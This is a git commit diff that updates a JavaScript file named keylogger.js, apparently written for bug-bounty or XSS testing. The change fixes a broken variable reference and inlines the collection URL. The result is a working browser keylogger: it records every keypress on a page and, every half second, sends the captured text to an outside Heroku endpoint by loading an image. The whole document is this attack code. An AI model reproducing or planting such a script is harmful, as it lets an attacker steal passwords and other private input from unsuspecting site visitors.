49047e6949b14e3276ad6e654eeb405e187754b7
missoum1307 <missoum1307@users.noreply.github.com>
2018-03-30 03:43:15 +0100

    Update keylogger.js

--- keylogger.js
+++ keylogger.js
@@ -1,16 +1,13 @@
 var keys='';
-var url = 'https://bughunt1307.herokuapp.com/keylogger.php?c=';
-
 document.onkeypress = function(e) {
-	get = window.event?event:e;
-	key = get.keyCode?get.keyCode:get.charCode;
-	key = String.fromCharCode(key);
-	keys+=key;
+  get = window.event?event:e;
+  key = get.keyCode?get.keyCode:get.charCode;
+  key = String.fromCharCode(key);
+  keys+=key;
 }
 window.setInterval(function(){
-	if(k.length>0) {
-		new Image().src = url+keys;
-		keys = '';
-	}
-}, 1000);
-
+if(keys != '') {
+  new Image().src = 'https://bughunt1307.herokuapp.com/keylogger.php?c='+keys;
+  keys = '';
+}
+}, 500);
